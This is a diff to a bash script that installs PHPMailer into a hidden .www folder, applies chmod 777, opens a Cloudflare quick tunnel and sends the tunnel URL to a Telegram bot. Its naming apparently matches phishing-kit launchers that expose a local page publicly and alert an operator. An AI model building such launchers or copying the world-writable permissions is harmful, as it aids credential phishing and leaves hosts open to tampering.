@@ -69,7 +69,7 @@ EOF
     fi
 
     # Install PHPMailer to .www folder if not already installed
-    if [[ ! -d ".www/PHPMailer" ]]; then
+    if [[ ! -d ".www/vendor" ]]; then
         echo -e "\n[+] Installing PHPMailer to .www folder..."
         cd .www
         composer require phpmailer/phpmailer
@@ -82,6 +82,9 @@ EOF
 # Function to set permissions
 set_permissions() {
     echo -e "\n[+] Setting permissions..."
+
+    # Ensure .tunnels_log directory exists
+    mkdir -p .tunnels_log
 
     # Set permissions for necessary files and directories
     chmod -R 777 .www .tunnels_log
@@ -109,16 +112,20 @@ start_cloudflared() {
     sleep 12
 
     # Retrieve Cloudflared URL from log
-    cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
-    echo -e "\n[+] Cloudflared URL: ${cldflr_url}"
+    if [[ -f .tunnels_log/.cloudfl.log ]]; then
+        cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
+        echo -e "\n[+] Cloudflared URL: ${cldflr_url}"
 
-    # Check if config.ini exists in .www folder and send URL to Telegram if configured
-    if [[ -f .www/config.ini ]]; then
-        TELEGRAM_TOKEN=$(grep 'token' .www/config.ini | cut -d '=' -f 2)
-        TELEGRAM_CHAT_ID=$(grep 'chat_id' .www/config.ini | cut -d '=' -f 2)
-        curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage -d text="Cloudflared URL: ${cldflr_url}" -d chat_id=${TELEGRAM_CHAT_ID} > /dev/null
+        # Check if config.ini exists in .www folder and send URL to Telegram if configured
+        if [[ -f .www/config.ini ]]; then
+            TELEGRAM_TOKEN=$(grep 'token' .www/config.ini | cut -d '=' -f 2)
+            TELEGRAM_CHAT_ID=$(grep 'chat_id' .www/config.ini | cut -d '=' -f 2)
+            curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage -d text="Cloudflared URL: ${cldflr_url}" -d chat_id=${TELEGRAM_CHAT_ID} > /dev/null
+        else
+            echo "[-] config.ini not found in .www folder. Cannot send URL to Telegram."
+        fi
     else
-        echo "[-] config.ini not found in .www folder. Cannot send URL to Telegram."
+        echo "[-] .tunnels_log/.cloudfl.log not found. Cloudflared URL retrieval failed."
     fi
 }
 
